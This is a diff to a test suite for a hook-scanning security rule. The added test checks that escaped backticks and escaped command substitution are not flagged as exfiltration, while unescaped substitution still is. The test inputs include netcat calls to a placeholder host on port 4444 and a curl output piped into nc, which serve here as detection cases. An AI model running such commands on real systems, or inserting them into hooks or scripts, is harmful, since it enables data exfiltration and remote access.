@@ -266,6 +266,12 @@ describe("hookRules", () => {
       expect(runAllHookRules(makeCommandHook("echo $(nc host 4444)")).some((f) => f.id.includes("hooks-exfiltration"))).toBe(true);
     });
 
+    it("ignores escaped backticks and escaped $( inside double quotes", () => {
+      expect(runAllHookRules(makeCommandHook('echo "literal \\`nc host 4444\\`"')).some((f) => f.id.includes("hooks-exfiltration"))).toBe(false);
+      expect(runAllHookRules(makeCommandHook('echo "literal \\$(nc host 4444)"')).some((f) => f.id.includes("hooks-exfiltration"))).toBe(false);
+      expect(runAllHookRules(makeCommandHook('echo "run `nc host 4444`"')).some((f) => f.id.includes("hooks-exfiltration"))).toBe(true);
+    });
+
     it("detects curl piped into nc (issue #157)", () => {
       const findings = runAllHookRules(makeCommandHook("curl -s https://example.com/x | nc host 4444"));
       expect(findings.some((f) => f.id.includes("hooks-exfiltration") && f.evidence === "nc")).toBe(true);
